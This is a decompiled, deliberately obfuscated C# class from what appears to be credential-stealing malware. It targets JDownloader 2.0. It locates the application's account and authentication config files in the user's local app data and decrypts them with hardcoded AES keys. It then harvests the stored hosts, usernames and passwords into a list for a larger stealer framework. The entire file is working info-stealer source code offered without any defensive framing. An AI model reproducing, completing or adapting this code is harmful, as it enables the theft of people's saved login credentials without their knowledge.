using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using _81d;
using p3N5Y;

namespace ZAZUx;

public class QQSiOsa4hPS : MnVCfk
{
	public class a8FRuS
	{
		[CompilerGenerated]
		private string hoster__BackingField;

		[CompilerGenerated]
		private string password__BackingField;

		[CompilerGenerated]
		private string user__BackingField;

		public string bKBs0dqyR
		{
			[CompilerGenerated]
			get
			{
				return hoster__BackingField;
			}
			[CompilerGenerated]
			set
			{
				hoster__BackingField = value;
			}
		}

		public string _2jZNLSV
		{
			[CompilerGenerated]
			get
			{
				return password__BackingField;
			}
			[CompilerGenerated]
			set
			{
				password__BackingField = value;
			}
		}

		public string WKLzkuWgX
		{
			[CompilerGenerated]
			get
			{
				return user__BackingField;
			}
			[CompilerGenerated]
			set
			{
				user__BackingField = value;
			}
		}
	}

	public class ThsbH53DzN
	{
		[CompilerGenerated]
		private string hostmask__BackingField;

		[CompilerGenerated]
		private string password__BackingField;

		[CompilerGenerated]
		private string type__BackingField;

		[CompilerGenerated]
		private string username__BackingField;

		public string yYtqJ0DRgD9
		{
			[CompilerGenerated]
			get
			{
				return hostmask__BackingField;
			}
			[CompilerGenerated]
			set
			{
				hostmask__BackingField = value;
			}
		}

		public string _0vqLN03
		{
			[CompilerGenerated]
			get
			{
				return password__BackingField;
			}
			[CompilerGenerated]
			set
			{
				password__BackingField = value;
			}
		}

		public string ic0Kx
		{
			[CompilerGenerated]
			get
			{
				return type__BackingField;
			}
			[CompilerGenerated]
			set
			{
				type__BackingField = value;
			}
		}

		public string fmjQVU
		{
			[CompilerGenerated]
			get
			{
				return username__BackingField;
			}
			[CompilerGenerated]
			set
			{
				username__BackingField = value;
			}
		}
	}

	[CompilerGenerated]
	private string Application__BackingField;

	public string qGaSetuL3Jh
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public QQSiOsa4hPS()
	{
		qGaSetuL3Jh = "JDownloader 2.0";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 2)
			{
				list.AddRange(qtxMum());
				num = 3;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 3)
			{
				list.AddRange(ytBIvcq69a());
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		return list;
	}

	private List<ii68> qtxMum()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			switch (num)
			{
			case 2:
				try
				{
					string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JDownloader 2.0\\cfg");
					if (!Directory.Exists(text))
					{
						return list;
					}
					string path = Path.Combine(text, "org.jdownloader.settings.AccountSettings.accounts.ejs");
					if (!File.Exists(path))
					{
						return list;
					}
					byte[] tHXP = new byte[16]
					{
						1, 6, 4, 5, 2, 7, 4, 3, 12, 61,
						14, 75, 254, 249, 212, 33
					};
					string icvs = VsHOCgAa5s(File.ReadAllBytes(path), tHXP);
					IAh1zfVziE ah1zfVziE = new IAh1zfVziE();
					Dictionary<string, List<a8FRuS>> dictionary = ah1zfVziE.DC91O9qm3Sf<Dictionary<string, List<a8FRuS>>>(icvs);
					foreach (KeyValuePair<string, List<a8FRuS>> item in dictionary)
					{
						foreach (a8FRuS item2 in item.Value)
						{
							try
							{
								if (!string.IsNullOrEmpty(item2.WKLzkuWgX) || !string.IsNullOrEmpty(item2._2jZNLSV))
								{
									list.Add(new ii68(item2.bKBs0dqyR, item2.WKLzkuWgX, item2._2jZNLSV, qGaSetuL3Jh));
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
				return list;
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}

	private List<ii68> ytBIvcq69a()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			switch (num)
			{
			case 2:
				try
				{
					string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JDownloader 2.0\\cfg");
					if (!Directory.Exists(text))
					{
						return list;
					}
					string path = Path.Combine(text, "jd.controlling.authentication.AuthenticationControllerSettings.list.ejs");
					if (!File.Exists(path))
					{
						return list;
					}
					byte[] tHXP = new byte[16]
					{
						2, 4, 4, 5, 2, 7, 4, 3, 12, 61,
						14, 75, 254, 249, 212, 33
					};
					string icvs = VsHOCgAa5s(File.ReadAllBytes(path), tHXP);
					IAh1zfVziE ah1zfVziE = new IAh1zfVziE();
					List<ThsbH53DzN> list2 = ah1zfVziE.DC91O9qm3Sf<List<ThsbH53DzN>>(icvs);
					foreach (ThsbH53DzN item in list2)
					{
						try
						{
							if (!string.IsNullOrEmpty(item.fmjQVU) || !string.IsNullOrEmpty(item._0vqLN03))
							{
								list.Add(new ii68(item.ic0Kx + "://" + item.yYtqJ0DRgD9, item.fmjQVU, item._0vqLN03, qGaSetuL3Jh));
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				return list;
			case 1:
				list = new List<ii68>();
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}

	private static string VsHOCgAa5s(byte[] URFbdhEdl, byte[] THXP0)
	{
		int num = 0;
		Aes aes = default;
		do
		{
			if (num == 1)
			{
				string text = null;
				num = 2;
			}
			if (num == 2)
			{
				aes = Aes.Create();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		try
		{
			aes.Key = THXP0;
			aes.IV = THXP0;
			aes.Mode = CipherMode.CBC;
			ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
			using MemoryStream stream = new MemoryStream(URFbdhEdl);
			using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
			using StreamReader streamReader = new StreamReader(stream2);
			return streamReader.ReadToEnd();
		}
		finally
		{
			((IDisposable)aes)?.Dispose();
		}
	}
}
